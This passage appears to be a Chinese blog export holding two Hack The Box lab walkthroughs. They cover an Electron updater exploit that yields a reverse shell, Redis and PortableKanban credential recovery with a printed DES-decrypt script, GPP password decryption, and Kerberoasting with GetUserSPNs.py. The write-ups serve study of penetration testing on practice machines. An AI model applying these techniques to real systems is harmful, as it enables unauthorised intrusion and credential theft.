<p>往下看的时候，发现guest用户可以登录smb服务，那我们就先看看smb服务里边都有哪些有价值的信息。<br><img src="https://img-blog.csdnimg.cn/35ce3f11c2ea4febac8767c3761d9f0f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>使用匿名登录看看可以访问到哪些信息，可以看到具有读写权限的目录只有<code>Software_Updates</code>这个目录<br><img src="https://img-blog.csdnimg.cn/901c2bdb6d4d4e7da7675e1c24ee1e36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们登录进这个目录中，有一个pdf文件可以下载，我们下载查看了下里面的内容。<br><img src="https://img-blog.csdnimg.cn/2ecb65835531481289d535ee549568a4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1edacfc8f7844517bae4f0e7dbd97af0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>查看完这些信息后，我们继续访问web服务。在服务的底端存在一个邮箱账号和域名，我们先添加到hosts文件中，便于后面进行目录爆破和子域名的搜集。<br><img src="https://img-blog.csdnimg.cn/35cf8a81609b4187930f03c62fcf602d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>那么我们就使用<code>gobuster</code>进行域名和目录的爆破吧<br><img src="https://img-blog.csdnimg.cn/916619d4e1dc4bfba3e44627be4f0f36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b59b2cb6beb94f13bd94e36d031e5dba.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现好像并没有什么有价值的信息，哎！还是老老实实去下载软件吧。。。<br><img src="https://img-blog.csdnimg.cn/cc46996341604dffb098519776c2cfc8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发现是个exe程序，那我们把它丢Windows上运行看看效果是怎么样的<br><img src="https://img-blog.csdnimg.cn/aea7a78db0594a95b20e01811fc600ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在yml文件中发现了这是一个电子应用程序<br><img src="https://img-blog.csdnimg.cn/1447b123093e4cf79c5fbdf992c90238.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们根据搜索到的信息，上谷歌进行搜索，可以看到有一位大佬发现了这个漏洞<br><img src="https://img-blog.csdnimg.cn/d4b8f3b4ba784683918c21291c351027.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3576872644644aef95d67125deffcd4f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>大佬已经给出了漏洞利用的方法，首先先使用包含单引号的文件名，然后重新计算文件哈希以匹配攻击者提供的二进制文件。<br><img src="https://img-blog.csdnimg.cn/2ce2ad37d7314f4781ca47e3372b791c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们先生成一个带有单引号的有效载荷<br><img src="https://img-blog.csdnimg.cn/841300482268465f928a7a1c6029c243.png" alt="在这里插入图片描述"><br>然后我们按照上面的方法，生成一个 sha512 sum hash 并将其转换为十六进制，然后进一步转换为base64<br><img src="https://img-blog.csdnimg.cn/5222e5c555ae452499acff13d2f7999a.png" alt="在这里插入图片描述"><br>然后我们新建latest.yml这个文件，将上面生成的值进行复制粘贴<br><img src="https://img-blog.csdnimg.cn/d5c11c4ee72b45f09ef3842b265aec6b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>紧接着我们使用python开启一个服务器<br><img src="https://img-blog.csdnimg.cn/6a8bfdbfe08e4dbaad426ef2204b19f0.png" alt="在这里插入图片描述"><br>三个文件夹都要替换掉yml文件<br><img src="https://img-blog.csdnimg.cn/51201bef231a46a9a2b2221c45ffeb40.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/99de167220ab45808c982e771e32f731.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们在msf上对漏洞进行利用，设置好基本参数后，我们可以看到反弹的shell<br><img src="https://img-blog.csdnimg.cn/8cd39b8f18d34046a6a3a1abd41d1bd4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2ffa34dc528d4bffbf22bbff28573e83.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>我们先查看一下当前用户的权限</p>
<p><img src="https://img-blog.csdnimg.cn/46fc63e01a074f8780b9977a64491034.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>进入cmd终端进行操作<br><img src="https://img-blog.csdnimg.cn/572df466d9dd4791a92d255ca60aa7a7.png" alt="在这里插入图片描述"><br>进入<code>Program Files</code>这个目录查看主机都安装了哪些应用程序。可以看到安装了Redis数据库，是不是想试试未授权访问？这是直觉哈哈<br><img src="https://img-blog.csdnimg.cn/9a3ff33f781548e7be38f9fbb77d972b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们先进入这个目录，看看配置文件是否需要密码进行登录的。我们查找<code>redis.windows-service.conf</code>这个文件，使用命令<code>type redis.windows-service.conf | findstr requirepass</code>快速查找到登录数据库的密码<br><img src="https://img-blog.csdnimg.cn/bb3958f354d14907842c4a54f90141be.png" alt="在这里插入图片描述"><br>既然发现了密码，那我们直接尝试可不可以登录成功吧<br><img src="https://img-blog.csdnimg.cn/73ef19ef23b04f979996089529a2ec3b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们列出所有的hash看看，发现了一个比较有价值的信息<br><img src="https://img-blog.csdnimg.cn/21d54e0c5d914c8ea4288315af18521b.png" alt="在这里插入图片描述"><br>那我们查看一下user对应的信息，发现是一个管理员，并且还挖掘到了他对应的hash值<code>Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi</code><br><img src="https://img-blog.csdnimg.cn/3bf1bf2cbfb6417c9058a3d05d874987.png" alt="在这里插入图片描述"><br>既然涉及到用户信息，那我们就去Users目录下看看有没有什么有价值的信息吧。然而在jason的桌面上，我们看到了user.txt文件，拿到第一个flag值<img src="https://img-blog.csdnimg.cn/806ca1c22ee14f7fa5bb5688113ff486.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="t"><br>在jason的主机中，我们发现了他安装了两个应用程序，一个是<code>node_modules</code>和<code>PortableKanban</code><br><img src="https://img-blog.csdnimg.cn/171f022c449c4fdda60d7e6c67bca7a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/1bc9495245b24508b8408bee3570a7e6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们查看一下cfg配置文件，发现了对应的hash值<code>Odh7N3L9aVSeHQmgK/nj7RQL8MEYCUMb</code><br><img src="https://img-blog.csdnimg.cn/96ad43ed232e4c928dfb0b255cf0b550.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后我们在exploit-db中搜索到对应的漏洞利用代码<br><img src="https://img-blog.csdnimg.cn/c205078ffcc14aff81bba88d60aa34ad.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们对这个利用脚本进行简洁，让它直接输出对应的明文值。得到明文值<code>kidvscat_yes_kidvscat</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> des <span class="keyword">import</span> * <span class="comment">#python3 -m pip install des</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params"><span class="built_in">hash</span></span>):</span></span><br><span class="line">        <span class="built_in">hash</span> = base64.b64decode(<span class="built_in">hash</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        key = DesKey(<span class="string">b&quot;7ly6UznJ&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> key.decrypt(<span class="built_in">hash</span>,initial=<span class="string">b&quot;XuVUm5fR&quot;</span>,padding=<span class="literal">True</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(decode(<span class="string">&#x27;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/938feaacbc2d46888b987f570b3a166f.png" alt="在这里插入图片描述"></p>
<p>登录成功<br><img src="https://img-blog.csdnimg.cn/020f2b5f8b624d2b9420511bc70c6941.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>SMB</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Active</title>
    <url>/2021/12/24/Active/</url>
    <content><![CDATA[<h2 id="靶机信息"><a href="#靶机信息" class="headerlink" title="靶机信息"></a>靶机信息</h2><p><img src="https://img-blog.csdnimg.cn/eda8a039099d4943bbdadeca0b30a10a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>可以看到主机开放了135,445,88这些常见的端口<br><img src="https://img-blog.csdnimg.cn/5cf14b42521c4a969e73a389b2407517.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>可以匿名登录smb服务<br><img src="https://img-blog.csdnimg.cn/e3d0be21298842868f97f94a04e6481e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<span id="more"></span>

<p>我们看到存在一个<code>Replication</code>的目录，我们尝试登录进这个目录看看。发现存在<code>active.htb</code>目录，并且该目录下有几个有价值的目录信息<br><img src="https://img-blog.csdnimg.cn/5539c4e4a9ad4b5da24575f1cae90b36.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我经过细心查看后，只有在<code>\active.htb\Policies\&#123;31B2F340-016D-11D2-945F-00C04FB984F9&#125;\MACHINE\Preferences\Groups\</code>目录下找到一个<code>Groups.xml</code>文件，经过查看这是一个组策略文件，用于帐户管理的组策略存储在域控制器上的“Groups.xml”文件中，该文件隐藏在 SYSVOL 文件夹中。<br><img src="https://img-blog.csdnimg.cn/3dfeaf7a43274b6db80c1986b56c764c.png?x-oss-process=image/watermark,type%EE%80%86ZHJvaWRzYW5zZmFsbGJhY2s,shadow%EE%80%8650,text%EE%80%86Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size%EE%80%8620,color%EE%80%86FFFFFF,t%EE%80%8670,g%EE%80%86se,x%EE%80%8616" alt="在这里插入图片描述"><br>因为这个文件使用了特殊的算法进行加密的，所以我们可以使用<code>gpp-decrypt.py</code>这个脚本进行解密，解密出来的结果如下图所示<br><img src="https://img-blog.csdnimg.cn/3b1d134c71474bf78e60b56c7094f613.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<p>有了账户和密码后，我们登录SMB服务可以查看更多的共享<br><img src="https://img-blog.csdnimg.cn/a0cabca528234f819d7f3fac04fd95c5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>我们使用账户密码访问Users共享<br><img src="https://img-blog.csdnimg.cn/3d172d64bc1c426399eefb0f548f5fff.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>在桌面上找到第一个答案值<br><img src="https://img-blog.csdnimg.cn/9465fa15bea246989886ef686a471ddc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们使用<code>rpcclient</code>枚举用户名和用户组<br><img src="https://img-blog.csdnimg.cn/fe3c3ce5801a4fca8ff2eae28e6cc801.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用<code>GetUserSPNs.py</code>脚本获取与普通用户帐户关联的服务主体名称。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GetUserSPNs.py -dc-ip 10.10.10.100 active.htb/SVC_TGS -request</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/18a215bbad5044eea14f81afb92ed4a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们获取到哈希值后，使用john来破解得到明文密码。<br><img src="https://img-blog.csdnimg.cn/fefaa6cda3e74dbf93337c78a2fededc.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>现在我们有了管理员的凭据后，可以先看看管理员可以访问哪些共享。可以看到，我们可以访问C盘的共享<br><img src="https://img-blog.csdnimg.cn/ddc1a806b114476996349f7104571698.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们使用账号密码登录进入C盘目录<br><img src="https://img-blog.csdnimg.cn/44b03ce98746402491959058ebfaa443.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>并在桌面上查找到root.txt文件<br><img src="https://img-blog.csdnimg.cn/cdd2ab04ba094a5b9ec52a984a7b800f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>内网</category>
      </categories>
      <tags>
        <tag>Hack The Box</tag>
      </tags>
  </entry>
</search>
